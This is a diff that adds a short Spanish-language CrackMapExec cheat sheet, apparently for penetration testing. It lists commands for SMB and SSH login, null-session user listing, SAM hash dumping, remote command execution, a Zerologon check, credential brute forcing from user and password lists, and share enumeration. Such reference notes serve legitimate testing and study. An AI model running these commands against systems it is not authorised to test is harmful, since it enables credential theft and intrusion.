@@ -1,0 +1,23 @@
+▶ Por SMB (Autenticación SMB):
+  crackmapexec smb $IP -u <usuario> -p <contraseña>
+
+▶ Por SSH (Autenticación SSH):
+  crackmapexec ssh $IP -u <usuario/lista_de_usuarios> -p <contraseña/lista_de_contraseñas>
+
+▶ Enumeración de Usuarios (Listar usuarios SMB):
+  crackmapexec smb $IP -u '' -p '' --users
+
+▶ Dump de Hashes (Extraer SAM):
+  crackmapexec smb $IP -u <usuario> -p <contraseña> --sam
+
+▶ Ejecución de Comandos (Ejecutar comando remoto):
+  crackmapexec smb $IP -u <usuario> -p <contraseña> -x "whoami"
+
+▶ Escaneo de Vulnerabilidades (Buscar exploits como Zerologon):
+  crackmapexec smb $IP -u <usuario> -p <contraseña> -M zerologon
+
+▶ Fuerza Bruta de Dominio (Probar múltiples credenciales):
+  crackmapexec smb $IP -u users.txt -p passwords.txt --continue-on-success
+
+▶ Enumeración de Shares (Listar recursos compartidos):
+  crackmapexec smb $IP -u <usuario> -p <contraseña> --shares
